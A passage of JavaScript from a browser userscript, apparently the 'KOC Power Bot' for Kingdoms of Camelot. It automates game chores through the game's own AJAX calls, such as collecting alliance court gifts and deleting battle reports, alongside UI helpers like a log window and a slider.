    if (t.state == null){
      t.win.document.body.innerHTML = '<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; color:#cee; background-color:#cee}</style>\
        <BODY style="margin:0px; padding:0px; border:none">\
        <DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid">\
        <INPUT id=wlClear type=submit value="Clear"> &nbsp; <INPUT id=wlRev type=submit value="Bottom"></div>\
        <DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>';
      t.win.document.getElementById('wlClear').addEventListener('click', eventButClear, false);
      t.win.document.getElementById('wlRev').addEventListener('click', eventButReverse, false);
      t.eOut =  t.win.document.getElementById('wlOut');
      t.lastE = null;
      t.state = 1;
    }
  },

  writeText : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.write (msg.htmlSpecialChars());
  },
  
  write : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.open();
    var te = document.createElement('pre');
    var now = new Date();
    var m = [];
    var millis = now.getMilliseconds();
    m.push (now.toTimeString().substring (0,8));
    m.push ('.');
    if (millis<100)
      m.push('0');
    if (millis<10)
      m.push('0');
    m.push(millis);
    m.push (': ');
    m.push (msg);
    te.innerHTML = m.join('');
    if (t.reverse){
      if (t.lastE == null){
        t.eOut.appendChild(te);
        t.lastE = te;
      } else {
        t.eOut.insertBefore(te, t.lastE);
      }
      var hr = document.createElement('hr');
      t.eOut.insertBefore(hr, te);
      t.lastE = hr;
    } else {
      t.eOut.appendChild(te);
      t.eOut.appendChild(document.createElement('hr'));
    }
  },

};

/*********************************** Resources TAB ***********************************/
/****
courtDoAction.php
&atype=4&toid=1290791&givercityid=26654
{"ok":true,"gold":500,"resource":500,"resourcetype":"4"}
***/
Tabs.Resources = {
  tabDisabled : !ENABLE_SAMPLE_TAB,
  tabOrder : 100,
  resource : {1:'Food', 2:'Wood', 3:'Stone', 4:'Ore'},
  users : [],
  myDiv : null,
  doList : [], // list of gifts to accept
  accepting : false,
  city : null,
  total : {gold:0, 1:0, 2:0, 3:0, 4:0},
    
  init : function (div){
    var t = Tabs.Resources;
        t.myDiv = div;
    div.innerHTML = '<TABLE cellpadding=0 cellspacing=0 class=pbTab width=100%><TR><TD align=center><INPUT id="pballlist" type=submit value="Fetch User List" \></td></tr></table><HR>\
        <DIV id=resDiv style="width:100%; min-height:300px; height:100%">';
    document.getElementById('pballlist').addEventListener ('click', t.e_clickfetchlist, false);

  },
  
  show : function (){
  },
  hide : function (){
  },
  
  progress : function (msg, span, add){
    if(add)
        document.getElementById(span).innerHTML+=msg;
    else
        document.getElementById(span).innerHTML=msg;
  },

  e_clickfetchlist : function  (){     // (also cancel accepting)
    var t = Tabs.Resources;
    t.users = [];
    if (t.accepting){
      document.getElementById('pballlist').value = 'Fetch User List';
      document.getElementById('resDiv').innerHTML+= '<BR><SPAN class=boldRed>Cancelled.</span>';
      t.accepting = false;
      return;
    }
    document.getElementById('resDiv').innerHTML = 'Fetching user list ... <span id=pbResUserListCount></span>';
    
    t.fetchUserList (gotUserList);
    function gotUserList(userList){
        if(userList.length < 1){
            listGifts();
            return;
        }
        document.getElementById('resDiv').innerHTML += '<BR>Check if able to collect ... <span id=pbResUserAvailCount></span>';
        t.checkDailyAction(userList, listGifts);
    }
    
    function listGifts (){
      t.city = Cities.cities[0];
      var m = '<DIV class=pbStat><CENTER>User List &nbsp; &nbsp; &nbsp; ('+ t.users.length +' found)</center></div>';
      if (t.users.length<1){
        document.getElementById('resDiv').innerHTML = m + '<BR><BR><CENTER>No users found!</center>';
        return;
      }
      m += '<TABLE class=pbTab align=center><TR><TD align=right>City to apply gifts to: </td><TD id=pbrescityselspan></td></tr>\
          <TR><TD align=right>Select resource to collect</td><TD>'
        + htmlSelector (t.resource, Options.getResType, 'id=pbResColType')
        + '</td></tr><TR><TD>Select users you want to collect from and hit: </td><TD width=250><INPUT type=submit id=pbResDo value="Accept Resources">\
        &nbsp; <SPAN id=pbResNone class=boldRed></span></td></tr></table><HR><TABLE class=pbTab><TR valign=top><TD>\
        <INPUT id=pbResButAll type=submit value="All" style="width:100%; margin-bottom:5px"><BR><INPUT id=pbResButNone type=submit value="None"></td>\
        <TD width=10></td><TD><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabLined>\
        <TBODY id=pbResTbody style="height:250px; overflow:auto; display:block;">\
        <TR style="font-weight:bold; background:white"><TD>Name</td><TD>Might</td><TD width=20></td></tr>';
      for (var i=0; i<t.users.length; i++){
        m += '<TR><TD><INPUT type=checkbox id=pbrchk_'+ i +'> &nbsp;'+ t.users[i].name +'</td><TD>'+ t.users[i].might +'</td></tr>';
      }
      document.getElementById('resDiv').innerHTML = m + '</tbody></table></td></tr></table>';
      new CdispCityPicker ('pbrescitysel', document.getElementById('pbrescityselspan'), true, t.e_CityButton, t.city.idx);
      document.getElementById('pbResDo').addEventListener ('click', t.getErDone, false);
      document.getElementById('pbResButAll').addEventListener ('click', t.e_butAll, false);
      document.getElementById('pbResButNone').addEventListener ('click', t.e_butNone, false);
      // var tbody = document.getElementById('pbResTbody');
      // tbodyScroller (tbody, getRemainingHeight (tbody, mainPop.div));
    }
  },

  e_CityButton : function (city, x, y){
    var t = Tabs.Resources;
    t.city = city;
  },
  
  e_butAll : function (){
    var t = Tabs.Resources;
    for (var i=0; i<t.users.length; i++)
      document.getElementById('pbrchk_'+i).checked = true;
  },
  
  e_butNone : function (){
    var t = Tabs.Resources;
    for (var i=0; i<t.users.length; i++)
      document.getElementById('pbrchk_'+i).checked = false;
  },
  
  getErDone : function (){
    var t = Tabs.Resources;
    t.doList = [];
    document.getElementById('pbResNone').innerHTML = '';
    Options.getResType = document.getElementById('pbResColType').value;
    t.total = {gold:0, 1:0, 2:0, 3:0, 4:0};
    for (var i=0; i<t.users.length; i++){
      if (document.getElementById('pbrchk_'+i).checked)
        t.doList.push (t.users[i]);
    }
    if (t.doList.length==0){
      document.getElementById('pbResNone').innerHTML = 'None Selected!';
      return;
    }
    t.accepting = true;
    document.getElementById('pballlist').value = 'Stop Accepting';
    document.getElementById('resDiv').innerHTML = '<DIV id=rsltDiv style="height:400px; max-height:400px; overflow-y:auto"><B>Accepting from '+ t.doList.length +' users:</b><BR></div>';    
    t.acceptNext ();
  },

    
  allDone : function (msg){
    var t = Tabs.Resources;
    msg += '<BR><BR> Total resources gained : <BR>\
           Gold: '+addCommas(t.total.gold)+'<BR>';
    for(var i=1; i<=4; i++){
        msg += t.resource[i]+': '+addCommas(t.total[i])+'<BR>';
    }
    document.getElementById('rsltDiv').innerHTML += '<BR><BR>' + msg;
    document.getElementById('pballlist').value = 'Fetch User List';
    t.accepting = false;
  },
  
    
  acceptNext : function (){
    var t = Tabs.Resources;
    var gift = t.doList.shift();
    if (gift == null){
      t.allDone ('Done accepting resources.');
      return;
    }
    var acpDiv = document.getElementById('rsltDiv');
    var curDiv = document.createElement ('div');
    acpDiv.appendChild (curDiv);
    curDiv.innerHTML = '<B>From '+ gift.name +': ';    
    var statSpan = document.createElement ('span');
    curDiv.appendChild (statSpan);
    statSpan.innerHTML = 'Accepting... ';
    t.getCourtAction (gift, gotGiftData);
        
    function gotGiftData (rslt){
//logit ("getErDone.gotGiftData ... \n"+ inspect (gift, 8, 1));
      if (!t.accepting)
        return;
      if (rslt.ok){
        var msg = rslt.gold +' gold and '+rslt.resource +' '+ t.resource[rslt.resourcetype]+'&nbsp; &nbsp; OK.';
        actionLog ('Accepted from '+gift.name+': '+ rslt.gold +' gold and '+ rslt.resource +' '+ t.resource[rslt.resourcetype]);
        statSpan.innerHTML += msg;
        t.total.gold += rslt.gold;
        t.total[rslt.resourcetype] += rslt.resource;
        t.acceptNext ();  
        return;
      }
        
      if (rslt.msg)
        msg = '<B>'+ rslt.msg + '</b>';
      else
        msg = '<SPAN class=boldRed>ERROR: '+ rslt.ajaxErr +'</span>';

      curDiv.removeChild (statSpan);
      curDiv = document.createElement ('div');
      curDiv.className = 'indent25';
      acpDiv.appendChild (curDiv);
      curDiv.innerHTML = msg;
      t.acceptNext ();  
    }
    
  },

  getMembersInfo : function (pageNo, notify) {
    var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.pageNo = pageNo;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetMembersInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },
  
  getDailyAction : function (uid, notify){
    var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.pid = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/viewCourt.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },
  
  getCourtAction : function (gift, notify){
    var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.atype = Options.getResType;
    params.toid = gift.userId;
    params.givercityid = t.city.id;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/courtDoAction.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },
  
  checkDailyAction : function (userList, notify){
    var t = Tabs.Resources;
    var count = 0;
    t.getDailyAction(userList[count].userId, parseViewCourt);
    
    function parseViewCourt (rslt){
        if (!rslt.ok || rslt.errMsg)
            notify ({errMsg:'Ajax Comm Error'});
        if(rslt.dailyActionFlag == 0)
            t.users.push(userList[count]);
        t.progress(count, 'pbResUserAvailCount');
        count++;
        if(count < userList.length){
            t.getDailyAction(userList[count].userId, parseViewCourt);
        } else {
            notify();
        }
    }
  },
  
  // notify with gifts[] or: {errMsg:xxx}
  fetchUserList : function (notify){
    var t = Tabs.Resources;
    var userList = [];
    t.getMembersInfo(1, parseAlliancePage);
    
    function parseAlliancePage (rslt){
      if (!rslt.ok || rslt.errMsg)
        notify ({errMsg:'Ajax Comm Error'});
      var users = rslt.memberInfo;
      for(var k in users){
        userList.push({userId:users[k].userId, name:users[k].name, might:users[k].prestige, type:'alliance'});
      }
      t.progress(userList.length, 'pbResUserListCount');
      if(rslt.currentPage < rslt.noOfPages){
        t.getMembersInfo((rslt.currentPage+1), parseAlliancePage);
      } else {
        notify(userList);
      }
    }
    
    
  },
}



function addCommasWhole(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1;
}

function encode_utf8( s ){
  return unescape( encodeURIComponent( s ) );
}

function decode_utf8( s ){
  return decodeURIComponent( escape( s ) );
}

function CdialogCancelContinue (msg, canNotify, contNotify, centerElement){
  var pop = new pbPopup ('ptcancont', 10, 10, 400,200, true, canNotify);
  if (centerElement)
    pop.centerMe(centerElement);
  else
    pop.centerMe(document.body);
  pop.getTopDiv().innerHTML = '<CENTER>KOC Power Bot</center>';
  pop.getMainDiv().innerHTML = '<TABLE class=ptTab align=center style="height: 100%"><TR align=center height=90%><TD>'+ msg +'</td></tr>\
      <TR align=center><TD><INPUT id=ptok type=submit value="OK" \> &nbsp; &nbsp; </td></tr></table>';
  document.getElementById('ptok').addEventListener ('click', function (){pop.destroy(false); if (canNotify) canNotify();}, false);
  pop.show(true);
}

function CdialogConfirm (msg, canNotify, contNotify, centerElement){
  var pop = new pbPopup ('ptcancont', 10, 10, 400,200, true, canNotify);
  if (centerElement)
    pop.centerMe(centerElement);
  else
    pop.centerMe(document.body);
  pop.getTopDiv().innerHTML = '<CENTER>KOC Power Bot</center>';
  pop.getMainDiv().innerHTML = '<TABLE class=ptTab align=center style="height: 100%"><TR align=center height=90%><TD colspan=2>'+ msg +'</td></tr>\
      <TR align=center><TD><INPUT id=pbok type=submit value="OK" \> &nbsp; &nbsp; </td><TD><INPUT id=pbcancel type=submit value="CANCEL" \> &nbsp; &nbsp; </td></tr></table>';
  document.getElementById('pbok').addEventListener ('click', function (){pop.destroy(false); if (canNotify) canNotify(this);}, false);
  document.getElementById('pbcancel').addEventListener ('click', function (){pop.destroy(false); if (canNotify) canNotify(this);}, false);
  pop.show(true);
}

function hexDump (dat){
  var i = 0;
  var s = [];
  while (i < dat.length) {
    asc = [];
    s.push (hex4(i));
    s.push (': ');
    for (var ii=0; ii<16; ii++) {
      c = dat.charCodeAt(i+ii);
      s.push (hex2(c));
      s.push (' ');
      if (c>31 && c<128)
        asc.push (dat.charAt(i+ii));
      else
        asc.push ('.');
    }
    s.push ('  ');
    s.push (asc.join(''))
    s.push ('\n');
    i += 16;
  }
  return s.join ('');
  function hex4(d){
    return hexDig(d>>12) + hexDig(d>>8) + hexDig(d>>4) + hexDig(d&15);
  }
  function hex2(d){
    return hexDig(d>>4) + hexDig(d&15);
  }
  function hexDig (d){
    hexdigs = '0123456789ABCDEF';
    return hexdigs.charAt(d&15);    
  }
}
 
// value is 0 to 1.0
function SliderBar (container, width, height, value, classPrefix, margin){
  var self = this;
  this.listener = null;
  if (value==null)
    value = 0;
  if (!margin)
    margin = parseInt(width*.05);
  this.value = value;
  if (width<20) width=20;
  if (height<5) height=5;
  if (classPrefix == null){
    classPrefix = 'slider';
    var noClass = true;
  }    
  var sliderHeight = parseInt(height/2);
  var sliderTop = parseInt(height/4);
  this.sliderWidth = width - (margin*2);
    
  this.div = document.createElement ('div');
  this.div.style.height = height +'px';
  this.div.style.width = width +'px';
  this.div.className = classPrefix +'Cont';
  if (noClass)
    this.div.style.backgroundColor='#ddd';
  
  this.slider = document.createElement ('div');
  this.slider.setAttribute ('style', 'position:relative;');
  this.slider.style.height = sliderHeight + 'px'
  this.slider.style.top = sliderTop + 'px';
  this.slider.style.width = this.sliderWidth +'px';
  this.slider.style.left = margin +'px';   /////
  this.slider.className = classPrefix +'Bar';
  this.slider.draggable = true;
  if (noClass)
    this.slider.style.backgroundColor='#fff';
  
  this.sliderL = document.createElement ('div');
  this.sliderL.setAttribute ('style', 'width:100px; height:100%; position:relative; ');
  this.sliderL.className = classPrefix +'Part';
  this.sliderL.draggable = true;
  if (noClass)
    this.sliderL.style.backgroundColor='#0c0';
  
  this.knob = document.createElement ('div');
  this.knob.setAttribute ('style', 'width:3px; position:relative; left:0px; background-color:#222');
  this.knob.style.height = height +'px';
  this.knob.style.top = (0-sliderTop) +'px';
  this.knob.className = classPrefix +'Knob';
  this.knob.draggable = true;
  this.slider.appendChild(this.sliderL);
  this.sliderL.appendChild (this.knob);
  this.div.appendChild (this.slider);
  container.appendChild (this.div);
  this.div.addEventListener('mousedown',  mouseDown, false);

  this.getValue = function (){
    return self.value;
  }

  this.setValue = function (val){   // todo: range check
    var relX = (val * self.sliderWidth);
    self.sliderL.style.width = relX + 'px';
    self.knob.style.left =  relX + 'px';
    self.value = val;
    if (self.listener)
      self.listener(self.value);
  }
  
  this.setChangeListener = function (listener){
    self.listener = listener;
  }

  function moveKnob (me){
    var relX = me.clientX - self.divLeft;
    if (relX < 0)
      relX = 0;
    if (relX > self.sliderWidth)
      relX = self.sliderWidth;
    self.knob.style.left = (relX - (self.knob.clientWidth/2) ) +'px';   // - half knob width !?!?
    self.sliderL.style.width = relX + 'px';
    self.value =  relX / self.sliderWidth; 
    if (self.listener)
      self.listener(self.value);
  }
  function doneMoving (){
    self.div.removeEventListener('mousemove', mouseMove, true);
    document.removeEventListener('mouseup', mouseUp, true);
  }
  function mouseUp (me){
    moveKnob (me);
    doneMoving();
  }
  
  function mouseDown(me){
    var e = self.slider;
    self.divLeft = 0;
    while (e.offsetParent){   // determine actual clientX
      self.divLeft += e.offsetLeft;
      e = e.offsetParent;
    }
    moveKnob (me);
    document.addEventListener('mouseup',  mouseUp, true);
    self.div.addEventListener('mousemove',  mouseMove, true);
  }
  function mouseMove(me){
    moveKnob (me);
  }
}

function pause(milliseconds) {
    var dt = new Date();
    while ((new Date()) - dt <= milliseconds) { /* Do nothing */ }
}

function CmatSimpleSound (playerUrl, container, attrs, onLoad, flashVars) {
  var self = this;
  this.player = null;
  this.volume = 100;
  this.isLoaded = false;
  this.onSwfLoaded = null;
  
  var div = document.createElement ('div');
  this.onSwfLoaded = onLoad;
  if (navigator.appName.toLowerCase().indexOf('microsoft')+1) {
    div.innerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0"><param name="movie" value="'+playerUrl+'"><param name="quality" value="high"></object>';
    this.player = div.getElementsByTagName('object')[0];
  } else {
    div.innerHTML = '<embed src="'+playerUrl+'"  bgcolor="#eeeeee" allowfullscreen=false FlashVars="'+ flashVars +'" quality="high" allowscriptaccess="always" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" ></embed>';
    this.player = div.getElementsByTagName('embed')[0].wrappedJSObject;
  }
  if (container)
    container.appendChild (div);
  else
    document.body.appendChild (div);
  for (k in attrs)
    this.player.setAttribute(k, attrs[k]);
       
  this.setVolume = function (chanNum, vol){
    if (!self.isLoaded)
      return;
    self.player.jsSetVolume (chanNum, vol);
    volume = vol;
  }
  
  this.load = function (chanNum, url, bStream, bAutoplay, bUsePolicyFile){   // loop ?
    self.player.jsLoad (chanNum, url, bStream, bAutoplay, bUsePolicyFile);
  }
  
  this.play = function (chanNum, position){
       if (this.isLoaded)
    self.player.jsPlay (chanNum, position);
  }
    
  this.stop = function (chanNum){
       if (this.isLoaded)
    self.player.jsStop (chanNum);
  }
    
  this.getStatus = function (chanNum){           // returns null if sound channel is 'empty'
   if (this.isLoaded)
    return self.player.jsGetStatus (chanNum);
  }
  
  this.debugFunc = function (msg){  // overload to use
  }
      
  this.swfDebug = function (msg){    // called by plugin
    self.debugFunc('SWF: '+ msg);
  }
  this.swfLoaded = function (){    // called by plugin when ready to go!
    self.isLoaded = true;
    self.debugFunc ('playerIsReady');
    if (self.onSwfLoaded)
      self.onSwfLoaded();
  }
  this.swfPlayComplete = function (chanNum){    // called by plugin when a sound finishes playing (overload to be notified)
  }
  this.swfLoadComplete = function (chanNum, isError){    // called by plugin when a sound finishes loading  (overload to be notified)
  }
}
    
function DoUnsafeWindow(func, execute_by_embed) {
    if(this.isChrome || execute_by_embed) {
        var scr=document.createElement('script');
        scr.innerHTML=func;
        document.body.appendChild(scr);
    } else {
        try {
            eval("unsafeWindow."+func);
        } catch (error) {
            logit("A javascript error has occurred when executing a function via DoUnsafeWindow. Error description: "+error.description);
        }
    }
}  

function GetDisplayName(){
    var DisplayName = document.getElementById('topnavDisplayName');
    if(DisplayName){
        DisplayName = DisplayName.innerHTML;
    }else{
        DisplayName = null;
    }
    return DisplayName
}

//modal_maptile((tileID),(Name),(X),(Y),(Gender+Avatar),(User),(Might),(Title),(AllianceName),(null),(tileProvinceId),(tilename),(CityState),(TileLevel),(allianceId),(tileCityId),(tileUserId),(TypeName),(misted));
//modal_maptile(453323,"Heineken4",172,622,"m6","Heineken",3758930,"60","Darkness",null,21,"city","Normal",9,2136,67677,1589067,"City",false);

//koc version-572
//modal_maptile(this,307227,"NewRetard",698,326,"m8","oftheNOOBS",42318533,"90","Darkness",null,14,"city","Normal",12,2136,26654,1550996,"City",false);return false;
function DrawLevelIcons() {
    var maptileRe = /modal_maptile.([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+)/;
    var mapwindow=document.getElementById('mapwindow');
    if(!mapwindow) return;
    var levelIcons=document.getElementById('levelIcons');
    if(levelIcons) return;

    var ss=document.evaluate(".//a[contains(@class,'slot')]",mapwindow,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
    var idDone=false;
    for(var s=0; s<ss.snapshotLength; s++) {
        var a=ss.snapshotItem(s);
        var onclick=a.getAttribute('id');
        //alert(onclick);
        var owner='';
        if(onclick) {
			// logit(onclick);
			var tileinfo = unsafeWindow.g_mapObject.model.getTileActions(onclick)["tileClick"];
			// logit(inspect(tileinfo));
            if(tileinfo) {
                var might = parseInt(tileinfo.might);
                var alliance = parseIntNan(tileinfo.allianceId);
                var dip = getDiplomacy(alliance);
                owner = tileinfo.username;
            }
        }
        var sp=a.getElementsByTagName('span');
        if(sp.length==0) continue;

        if(!idDone) { a.id='levelIcons'; idDone=true; }
        sp[0].style.color='#cc0';
        
        if (alliance == 'null' && tileinfo.type=="city") sp[0].style.color='#33CCFF';
        if (dip == 'hostile' && tileinfo.type=="city") sp[0].style.color='#FF0000';
        if (tileinfo.type!="city" &&  tileinfo.tileuserid!="null") sp[0].style.color='#FF9900';
        if (tileinfo.type!="city" &&  tileinfo.tileuserid=="null") sp[0].style.color='#CC0033';
        if (Options.MapShowExtra) {
            if (tileinfo.username!="null")
				sp[0].innerHTML = tileinfo.type+': '+ tileinfo.level +'<br />'+owner+'<br />Might:'+addCommas(might); //+'<br />Alliance:'+tileinfo.alliance
			else
				sp[0].innerHTML = tileinfo.type+': '+ tileinfo.level;
        }
        else {
            // if (onclickM && onclickM[7]!='"null"' ) sp[0].innerHTML='&nbsp;';
            // else sp[0].innerHTML='&nbsp;'+addCommas(owner);
        }
        
    }

}

function AjaxRequest2 (url, opts){
    var headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'X-Prototype-Version': '1.6.1',
        'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
    };
    var ajax = null; 
    if (window.XMLHttpRequest)
      ajax=new XMLHttpRequest();
    else
      ajax=new ActiveXObject("Microsoft.XMLHTTP"); 
    if (opts.method==null || opts.method=='')
      method = 'GET';
    else
      method = opts.method.toUpperCase();  
    if (method == 'POST'){
        headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
    } else if (method == 'GET'){
        addUrlArgs (url, opts.parameters);
    }  
    ajax.onreadystatechange = function(){
        // ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
        if (ajax.readyState==4) {
            if (ajax.status >= 200 && ajax.status < 305)
            if (opts.onSuccess) opts.onSuccess(ajax);
            else
                if (opts.onFailure) opts.onFailure(ajax);
            } else {
                if (opts.onChange) opts.onChange (ajax);
            }
    }  
    ajax.open(method, url, true); // always async!
    for (var k in headers)
      ajax.setRequestHeader (k, headers[k]);
     if (matTypeof(opts.requestHeaders)=='object')
          for (var k in opts.requestHeaders)
            ajax.setRequestHeader (k, opts.requestHeaders[k]);
    if (method == 'POST'){
        var a = [];
        for (k in opts.parameters){
              if(matTypeof(opts.parameters[k]) == 'object'){
                  for(var h in opts.parameters[k]){
                      if(matTypeof(opts.parameters[k][h]) == 'object'){
                          for(var i in opts.parameters[k][h]){
                              if(matTypeof(opts.parameters[k][h][i]) == 'object'){
                              for(var j in opts.parameters[k][h][i]){
                                  a.push (k+'['+h+']['+i+']['+j+'] ='+ opts.parameters[k][h][i][j] );
                              }
                              } else
                                  a.push (k+'['+h+']['+i+']'+' ='+ opts.parameters[k][h][i]);
                          }
                      } else
                      a.push (k+'['+h+'] ='+ opts.parameters[k][h] );
                  }
              } else
              a.push (k +'='+ opts.parameters[k] );
        }
        ajax.send (a.join ('&'));
    } else {
        ajax.send();
    }
}

function saveAttackOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('AttackOptions_'+serverID, JSON2.stringify(AttackOptions));}, 0);
}

function readAttackOptions (){
  var serverID = getServerId();
  s = GM_getValue ('AttackOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          AttackOptions[k][kk] = opts[k][kk];
      else
        AttackOptions[k] = opts[k];
    }
  }
}

function saveFarmOptions() {
    var serverID = getServerId();
    setTimeout(function () {
        GM_setValue('FarmOptions_' + serverID, JSON2.stringify(FarmOptions));
    }, 0);
}

function readFarmOptions() {
    var serverID = getServerId();
    s = GM_getValue('FarmOptions_' + serverID);
    if (s != null) {
        opts = JSON2.parse(s);
        for (k in opts) {
            if (matTypeof(opts[k]) == 'object') for (kk in opts[k])
            FarmOptions[k][kk] = opts[k][kk];
            else FarmOptions[k] = opts[k];
        }
    }
}

function saveThroneOptions() {
    var serverID = getServerId();
    setTimeout(function () {
        GM_setValue('ThroneOptions_' + serverID, JSON2.stringify(ThroneOptions));
    }, 0);
}

function readThroneOptions() {
    var serverID = getServerId();
    s = GM_getValue('ThroneOptions_' + serverID);
    if (s != null) {
        opts = JSON2.parse(s);
        for (k in opts) {
            if (matTypeof(opts[k]) == 'object')
				for (kk in opts[k])
					ThroneOptions[k][kk] = opts[k][kk];
            else ThroneOptions[k] = opts[k];
        }
    }
}


 
var DeleteReports = {
    deleting : false,
    init : function(){
        var t = DeleteReports;
        setInterval(t.startdeletereports, 2*60*1000);
        setTimeout(t.startdeletereports, 10);
    },
    
    startdeletereports : function(){
        var t = DeleteReports;
          if(!t.deleting && (Options.DeleteMsg || Options.DeleteMsgs0 || Options.DeleteMsgs1 || Options.DeleteMsgs2 || Options.DeleteMsgs3)){
              t.deleting = true;
              t.fetchreport(0, t.checkreports);
          }
    },
    
    fetchreport : function(pageNo, callback){
        var t = DeleteReports;
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        if(pageNo > 1)
            params.pageNo = pageNo;
        new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/listReports.php" + unsafeWindow.g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function (rslt) {
                callback(rslt);
            },
                onFailure: function () {
                callback();
            },
        });
    },
    
    checkreports : function(rslt){
        var t = DeleteReports;
        if(!rslt.ok){
            t.deleting = false;
            return;
        }
        if(rslt.arReports.length < 1){
        logit("CR stopped arreports < 1");
            t.deleting = false;
            return;
        }
        var reports = rslt.arReports;
        var totalPages = rslt.totalPages;
        if (rslt.totalPages > 30)
        var totalPages = 30;
        var deletes1 = new Array();
        var deletes0 = new Array();
        for(k in reports){
            if(Options.DeleteMsg){
                if((reports[k].marchType==4 || reports[k].marchType==9) && reports[k].side0PlayerId==0 && reports[k].side0TileType > 50)
                    deletes1.push(k.substr(2));
                else if(reports[k].marchType==1 && t.isMyself(reports[k].side1PlayerId))
                    deletes1.push(k.substr(2));
            }
            if (Options.DeleteMsgs0){
                if(reports[k].marchType==1 && !t.isMyself(reports[k].side1PlayerId))
                    deletes0.push(k.substr(2));
            }
            if (Options.DeleteMsgs1){
                if((reports[k].side0TileType <= 50 || reports[k].side0TileType==54)&& reports[k].side0PlayerId==0)
                    deletes1.push(k.substr(2));

            }
            if (Options.DeleteMsgs2){
                for(i in CrestData) {
                    if(reports[k].side0XCoord == CrestData[i].X && reports[k].side0YCoord == CrestData[i].Y && reports[k].marchType==4 && t.isMyself(reports[k].side1PlayerId)) {
                        deletes1.push(k.substr(2));
                    }
                }

            }
            if (Options.DeleteMsgs3){
                for(i in CrestData) {
					for (l in unsafeWindow.seed.allianceDiplomacies.friendlyToThem) {
						if(reports[k].side1AllianceId == unsafeWindow.seed.allianceDiplomacies.friendlyToThem[l].allianceId)
                        deletes1.push(k.substr(2));
					}
					for (l in unsafeWindow.seed.allianceDiplomacies.friendly) {
						if(reports[k].side1AllianceId == unsafeWindow.seed.allianceDiplomacies.friendly[l].allianceId)
                        deletes1.push(k.substr(2));
					}
                }
			}            
        }
        if(deletes1.length > 0 || deletes0.length > 0){
            t.deleteCheckedReports(deletes1, deletes0);
        } else {
            t.deleting = false;
            return;
        }
    },
    
    deleteCheckedReports : function(deletes1, deletes0){
        var t = DeleteReports;
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.s1rids = deletes1.join(",");
        params.s0rids = deletes0.join(",");
        params.cityrids = '';
        new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/deleteCheckedReports.php" + unsafeWindow.g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function (rslt) {
                if(rslt.ok){
                    Seed.newReportCount = parseInt(Seed.newReportCount) - parseInt(deletes1.length) - parseInt(deletes0.length);
                    actionLog('Deleted: ' +parseInt(deletes1.length + deletes0.length)+' reports');
                }
                t.fetchreport(0, t.checkreports);
            },
            onFailure: function () {
            },
        });
    },
    
    isMyself: function(userID){
        var t = DeleteReports;
        if(!Seed.players["u"+userID])
            return false;
        if(Seed.players["u"+userID].n == Seed.player.name)
            return true;
        else
            return false;
        return false;
    },
}

/******************* Apothecary Tab **********************/
Tabs.Apothecary = {
  tabOrder : 591,                    // order to place tab in top bar
  tabDisabled : true, // if true, tab will not be added or initialized
  tabLabel : 'Apothecary',            // label to show in main window tabs
  cities : [],
  pop : null,
  pop2 : null,
  myDiv : null,
  timer : null,
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.Apothecary;
    t.myDiv = div;
    var m = '<DIV class=pbStat >APOTHECARY TAB</div><table width=100% height=0% class=pbTab><tr align=center >';
    m += '<td><input type=submit id=pbapothecary_power value="Auto Heal = '+(ApothecaryOptions.Active?'ON':'OFF')+'" /></td>\
          <td><input type=submit id=pbapothecary_show value="Show" /></td></tr></table>';
    m += '<DIV class=pbStat id=pbapothecary_options >OPTIONS</div></div><table></tr>\
